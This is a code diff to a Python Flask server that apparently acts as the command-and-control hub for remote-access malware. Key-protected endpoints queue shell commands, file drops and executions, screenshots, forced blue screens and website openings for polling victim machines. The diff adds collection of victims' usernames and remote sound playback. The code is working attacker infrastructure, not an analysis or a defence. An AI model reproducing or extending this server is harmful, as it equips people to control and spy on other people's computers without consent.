@@ -1,8 +1,8 @@
 from flask_limiter.util import get_remote_address
 from flask import Response, request, Flask
-from base64 import b64encode, b64decode
 from flask_limiter import Limiter
 from threading import Thread
+from base64 import b64encode
 from hashlib import sha256
 from time import sleep
 
@@ -32,8 +32,47 @@ dropfile: bytes = b""
 dropfile_location: str = ""
 dropfile_ips: list[str] = []
 
+users: list[str] = []
+getuser_ips: list[str] = []
+get_user: bool = False
+
+playsound_ips: list[str] = []
+sound_file: bytes = b""
+
 
 # Centers
+
+
+@app.route("/playsound-center", methods=["GET"])
+def playsound_center() -> Response:
+    global playsound_ips, sound_file
+    if len(sound_file) == 0:
+        return Response("no sounds to play", 204)
+    else:
+        remote_ip = get_remote_address()
+        if remote_ip in playsound_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            playsound_ips.append(remote_ip)
+            return sound_file
+
+
+@app.route("/getuser-center", methods=["GET", "POST"])
+def getuser_center() -> Response:
+    global getuser_ips, get_user, users
+    if request.method == "GET":
+        if not get_user:
+            return Response("no screenshots to take", 204)
+        else:
+            return Response("take screenshot", 200)
+    elif request.method == "POST":
+        remote_ip = get_remote_address()
+        if get_user and remote_ip not in getuser_ips:
+            users.append(request.args.get("username"))
+            getuser_ips.append(remote_ip)
+            return Response("added user", 200)
+        else:
+            return Response("u cant do that rn", 400)
 
 
 @app.route("/dropfile-center", methods=["GET"])
@@ -55,7 +94,7 @@ def dropfile_center() -> Response:
 
 @app.route("/website-center", methods=["GET"])
 def website_center() -> Response:
-    global website
+    global website_ips, website
     if len(website) == 0:
         return Response("no websites to open", 204)
     else:
@@ -69,7 +108,7 @@ def website_center() -> Response:
 
 @app.route("/screenshot-center", methods=["GET", "POST"])
 def screenshot_center() -> Response:
-    global take_screenshot, screenshot_urls
+    global take_screenshot, screenshot_urls, screenshot_ips
     if request.method == "GET":
         if not take_screenshot:
             return Response("no screenshots to take", 204)
@@ -87,7 +126,7 @@ def screenshot_center() -> Response:
 
 @app.route("/runfile-center", methods=["GET"])
 def runfile_center() -> Response:
-    global runfile_args, runfile
+    global runfile_ips, runfile_args, runfile
     if len(runfile) == 0:
         return Response("no files to execute", 204)
     else:
@@ -101,7 +140,7 @@ def runfile_center() -> Response:
 
 @app.route("/command-center", methods=["GET"])
 def command_center() -> Response:
-    global command
+    global command_ips, command
     if len(command) == 0:
         return Response("no commands to execute", 204)
     else:
@@ -115,7 +154,7 @@ def command_center() -> Response:
 
 @app.route("/image-center", methods=["GET"])
 def image_center() -> Response:
-    global image
+    global image_ips, image
     if len(image) == 0:
         return Response("no images to show", 204)
     else:
@@ -143,7 +182,16 @@ def bsod_center() -> Response:
 def get_screenshots() -> Response:
     if check_key(request.args.get("key")):
         global screenshot_urls
-        return Response("|".join(screenshot_urls), 200)
+        return Response("\n".join(screenshot_urls), 200)
+    else:
+        return Response("invalid key", 403)
+
+
+@app.route("/get_users", methods=["GET"])
+def get_users() -> Response:
+    if check_key(request.args.get("key")):
+        global users
+        return Response("\n".join(users), 200)
     else:
         return Response("invalid key", 403)
 
@@ -230,6 +278,26 @@ def post_dropfile() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_getuser", methods=["POST"])
+def post_getuser() -> Response:
+    if check_key(request.args.get("key")):
+        Thread(target=post_getuser_thread).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
+@app.route("/post_playsound", methods=["POST"])
+def post_image() -> Response:
+    if check_key(request.args.get("key")):
+        global sound_file
+        sound_file = request.files["soundFile"].stream.read()
+        Thread(target=post_playsound_thread, args=[sound_file]).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Threads
 
 
@@ -292,6 +360,24 @@ def post_dropfile_thread(data: bytes, location: str) -> None:
     dropfile = b""
     dropfile_location = ""
     dropfile_ips = []
+
+
+def post_getuser_thread() -> None:
+    global getuser_ips, get_user, users
+    get_user = True
+    sleep(8)
+    get_user = False
+    sleep(5)
+    users = []
+    getuser_ips = []
+
+
+def post_playsound_thread(sound_data: bytes) -> None:
+    global playsound_ips, sound_file
+    sound_file = sound_data
+    sleep(8)
+    sound_file = b""
+    playsound_ips = []
 
 
 # Static
